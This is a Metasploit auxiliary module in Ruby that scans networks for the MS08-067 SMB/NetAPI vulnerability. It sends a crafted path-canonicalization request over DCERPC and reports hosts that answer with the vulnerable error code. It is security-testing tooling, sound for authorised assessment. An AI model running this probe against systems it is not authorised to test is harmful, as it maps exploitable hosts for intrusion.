##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Scanner for MS08-067',
      'Description' => 'This module simply uses the check in the ms08_067_netapi.rc to scan a network for it',
      'References'     =>
        [
          [ 'CVE', '2008-4250'],
          [ 'OSVDB', '49243'],
          [ 'MSB', 'MS08-067' ],
          # If this vulnerability is found, ms08-67 is exposed as well
          [ 'URL', 'http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos']
        ],
      'Author'         =>
        [
          'hdm', # with tons of input/help/testing from the community
          'Brett Moore <brett.moore[at]insomniasec.com>',
          'frank2 <frank2@dc949.org>', # check() detection
          'jduck', # XP SP2/SP3 AlwaysOn DEP bypass
          'sho-luv', # cut and paste into auxiliary module
        ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' => {}
    )
    #deregister_options('MAILFROM', 'MAILTO')
    register_options(
      [
        OptString.new('SMBPIPE', [ true,  "The pipe name to use (BROWSER, SRVSVC)", 'BROWSER']),
      ], self.class)
  end

  def run_host(ip)
    if check_vuln == Msf::Exploit::CheckCode::Vulnerable
      print_good("#{ip}:#{rport} - MS08-067 VULNERABLE")
    end
  end

  def check_vuln
    begin
      connect()
      smb_login()
    rescue Rex::ConnectionError, Rex::Proto::SMB::Exceptions::LoginError
      return Msf::Exploit::CheckCode::Unknown
    end

    #
    # Build the malicious path name
    # 5b878ae7 "db @eax;g"
    prefix = "\\"
    path =
      "\x00\\\x00/"*0x10 +
      Rex::Text.to_unicode("\\") +
      Rex::Text.to_unicode("R7") +
      Rex::Text.to_unicode("\\..\\..\\") +
      Rex::Text.to_unicode("R7") +
      "\x00"*2

    server = Rex::Text.rand_text_alpha(rand(8)+1).upcase

    handle = dcerpc_handle( '4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',
      'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
    )

    begin
      # Samba doesn't have this handle and returns an ErrorCode
      dcerpc_bind(handle)
    rescue Rex::Proto::SMB::Exceptions::ErrorCode
      return Msf::Exploit::CheckCode::Safe
    end

    stub =
      NDR.uwstring(server) +
      NDR.UnicodeConformantVaryingStringPreBuilt(path) +
      NDR.long(8) +
      NDR.wstring(prefix) +
      NDR.long(4097) +
      NDR.long(0)

    resp = dcerpc.call(0x1f, stub)
    error = resp[4,4].unpack("V")[0]

    # Cleanup
    simple.client.close
    simple.client.tree_disconnect
    disconnect

    if (error == 0x0052005c) # \R :)
      return Msf::Exploit::CheckCode::Vulnerable
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end

end
